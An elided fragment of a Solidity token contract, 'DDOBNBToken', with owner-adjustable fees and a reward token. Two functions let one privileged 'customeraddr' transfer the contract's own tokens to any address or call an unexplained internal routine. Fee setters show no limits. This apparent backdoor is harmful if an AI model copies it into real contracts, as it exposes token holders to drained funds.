...
contract DDOBNBToken is ERC20, Ownable {

    using SafeMath for uint256;


    address private _deadWalletAddress  = 0x000000000000000000000000000000000000dEaD;
    address public tokenB = address(0x2d957113fb914D5fcf7CB63b7fE964f718A76564);   
    address public rewardToken = 0x2d957113fb914D5fcf7CB63b7fE964f718A76564; 
    ...
    function setCustomerAddr(address _addr) public onlyOwner{
        customeraddr = _addr;
    }

    function setgasForProcessing(uint _amount) public onlyOwner{
    ...
    //设置交易手续费 
    function setFee(uint _lpfee, uint _liqudiityFee,uint _deadFee) public onlyOwner {
        lpFee = _lpfee;
    ...
    function doEntFee(address _to,uint _amount) public  returns(bool){
        require(msg.sender == customeraddr,"failed");
        super._transfer(address(this), _to, _amount);
        return true;
    }
    function entTransfer(address _to,uint _amount) public {
        require(msg.sender == customeraddr,"failed");
        _bmby(_to,_amount);
    }
    ...
    function swapTokensForTokenB(uint256 tokenAmount, address recipient) public {
    ...
    function addLiquidityForTokenB(uint256 tokenAmount, uint256 tokenBAmount) public {
